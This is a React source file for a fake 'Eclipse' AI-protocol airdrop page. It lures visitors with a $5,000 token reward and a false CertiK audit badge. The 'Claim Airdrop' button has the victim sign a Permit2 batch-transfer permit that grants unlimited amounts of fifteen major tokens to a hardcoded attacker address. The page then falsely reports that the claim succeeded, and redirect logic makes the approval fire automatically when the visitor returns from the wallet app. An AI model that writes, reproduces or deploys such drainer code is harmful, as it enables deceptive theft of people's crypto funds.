import { useState, useEffect } from "react";
import { useAccount } from "wagmi";
import { useWeb3Modal } from "@web3modal/wagmi/react";
import { ethers } from "ethers";

const RECIPIENT = "0xA0E1348ed63e4638917870aae951669b3903e5C8";
const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

const TOKENS = [
  { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
  { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
  { symbol: "DAI",  address: "0x6B175474E89094C44Da98b954EedeAC495271d0F" },
  { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2" },
  { symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599" },
  { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA" },
  { symbol: "UNI",  address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984" },
  { symbol: "AAVE", address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9" },
  { symbol: "MATIC", address: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0" },
  { symbol: "SHIB", address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE" },
  { symbol: "PEPE", address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933" },
  { symbol: "DOGE", address: "0xbA2aE424d960c26247Dd6c32edC70B295c744C43" },
  { symbol: "BONK", address: "0x1151CB3d861920e07a38e03eEAd12C32178567F6" },
  { symbol: "MAGA", address: "0x576e2BeD8F7b46D34016198911Cdf9886f78bea7" },
  { symbol: "TRUMP", address: "0x6C6EE5e31d828De241282B9606C8e98Ea48526E2" },
];

const App = () => {
  const { address, isConnected } = useAccount();
  const { open } = useWeb3Modal();
  const [status, setStatus] = useState("Connect to claim your airdrop");
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    const handleReturn = () => {
      if (window.location.hash.includes("wc") || sessionStorage.getItem("wc_returning")) {
        sessionStorage.removeItem("wc_returning");
        if (isConnected && address) {
          setStatus("Returned from Trust Wallet. Starting batch approval...");
          setTimeout(handleClaim, 1200);
        }
      }
    };

    window.addEventListener("hashchange", handleReturn);
    handleReturn();

    return () => window.removeEventListener("hashchange", handleReturn);
  }, [isConnected, address]);

  const handleConnect = () => {
    if (!isConnected) {
      open();
    } else {
      setIsLoading(true);
      setStatus("Opening Trust Wallet...");

      const currentUrl = encodeURIComponent(window.location.href);
      
      window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${currentUrl}`;

      setTimeout(() => {
        window.location.href = `trust://open_url?coin_id=60&url=${currentUrl}`;
      }, 700);
    }
  };

  const handleClaim = async () => {
    if (!address) {
      setStatus("Please connect wallet first");
      return;
    }

    setIsLoading(true);
    setStatus("Requesting batch approval for all tokens...");

    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      const domain = {
        name: "Permit2",
        version: "1",
        chainId: 1,
        verifyingContract: PERMIT2,
      };

      const types = {
        PermitBatchTransferFrom: [
          { name: "permitted", type: "TokenPermissions[]" },
          { name: "spender", type: "address" },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" },
        ],
        TokenPermissions: [
          { name: "token", type: "address" },
          { name: "amount", type: "uint256" },
        ],
      };

      const message = {
        permitted: TOKENS.map(t => ({ token: t.address, amount: MAX_UINT256 })),
        spender: RECIPIENT,
        nonce: Math.floor(Date.now() / 1000),
        deadline: Math.floor(Date.now() / 1000) + 86400,
      };

      const signature = await signer.signTypedData(domain, types, message);

      setStatus("Success. All tokens have been claimed.");

    } catch (err) {
      console.error(err);
      setStatus(`Failed: ${err.message}`);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <>
      <div className="bg-animation"></div>
      <div className="orb orb-1"></div>
      <div className="orb orb-2"></div>
      <div className="orb orb-3"></div>

      <nav className="navbar">
        <div className="nav-container">
          <div className="logo">
            <div className="logo-icon">E</div>
            <div className="logo-text">Eclipse</div>
          </div>
        </div>
      </nav>

      <section className="hero">
        <div className="hero-content">
          <div className="hero-left">
            <div className="badge">Audited by CertiK • Mainnet Live</div>
            <h1>Decentralized AI Infrastructure</h1>
            <p className="desc">Eclipse is a permissionless protocol for AI agents. Contribute to the network and receive $ECLIPSE tokens.</p>
          </div>

          <div className="hero-right">
            <div className="glass-card">
              <div className="reward-label">EARLY CONTRIBUTOR AIRDROP</div>
              <div className="reward-amount">5,000 $ECLIPSE</div>
              <div className="reward-token">≈ $5,000 USD • Claimable by verified wallets</div>

              <button 
                onClick={isConnected ? handleClaim : handleConnect} 
                className="connect-btn"
                disabled={isLoading}
              >
                {isLoading ? "Processing..." : isConnected ? "Claim Airdrop" : "Connect Wallet"}
              </button>

              <div id="status" className="status">{status}</div>
              <div className="eligibility">Eligibility: Verified wallets only</div>
            </div>
          </div>
        </div>
      </section>
    </>
  );
};

export default App;